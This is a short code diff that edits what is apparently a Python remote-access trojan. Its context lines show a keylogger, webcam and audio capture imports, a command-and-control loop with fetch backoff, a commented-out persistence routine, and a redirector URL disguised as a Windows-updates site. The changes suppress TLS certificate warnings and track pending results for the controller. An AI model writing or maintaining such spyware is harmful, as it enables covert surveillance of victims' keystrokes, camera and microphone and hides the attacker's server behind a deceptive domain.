@@ -8,6 +8,7 @@
 import os
 import io
 import re
+import sys
 import uuid
 import json
 import time
@@ -26,6 +27,9 @@ import cv2
 import pyaudio
 import wave
 import keyboard  # pip install keyboard (requires admin for global hook)
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 # ===================== CONFIG =====================
 REDIRECTOR_URL = "https://windows-updates.vercel.app/"
@@ -218,7 +222,7 @@ def main():
     #establish_persistence()
     if "keylog" in sys.argv:  # optional: start keylogger early
         start_keylogger()
-    global c2_url, c2_fetch_backoff
+    global c2_url, c2_fetch_backoff, pending_results
     
     while True:
         if not c2_url:
@@ -412,3 +416,4 @@ if __name__ == "__main__":
     import sys
 
     main()
+
